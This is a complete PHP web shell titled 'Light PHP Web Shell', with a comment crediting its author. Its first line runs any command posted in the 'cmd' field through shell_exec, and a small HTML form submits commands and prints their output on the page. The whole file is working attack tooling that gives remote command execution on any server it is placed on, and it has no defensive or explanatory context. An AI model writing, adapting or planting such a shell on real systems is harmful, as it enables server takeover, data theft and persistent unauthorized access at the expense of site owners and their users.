<?php if (!empty($_POST['cmd'])) { $cmd = shell_exec($_POST['cmd']); } ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Light PHP Web Shell</title>
    <!-- Shell By https://github.com/b33rm3up -->
    <style>body{font-family:sans-serif;color:#000}.wrap{max-width:700px}.cmd_input{padding:10px;width:100%!important;max-width:600px!important;display:inline-block}.cmd_button{padding:12px;background-color:#04aa6d;border:none;font-weight:700;color:#fff;cursor:pointer}.cmd_button:hover{background-color:red}</style>
</head>

<body>
    <div class="wrap">
        <h2>Light PHP Web Shell</h2>
        <h3>Command Input</h3>
        <form method="post">
            <input  class="cmd_input" type="text" name="cmd" value="<?php htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'); ?>" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required />&nbsp;
            <button class="cmd_button" type="submit">Run ...</button>
        </form>

        <br><hr><br>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <h3>Command Output</h3>
        <?php if (isset($cmd)): ?>
            <p><?php echo nl2br(htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8')); ?></p>
        <?php else: ?>
            <p>Nothing to Display!</p>
        <?php endif; ?>
        <?php endif; ?>
    </div>
</body>
</html>
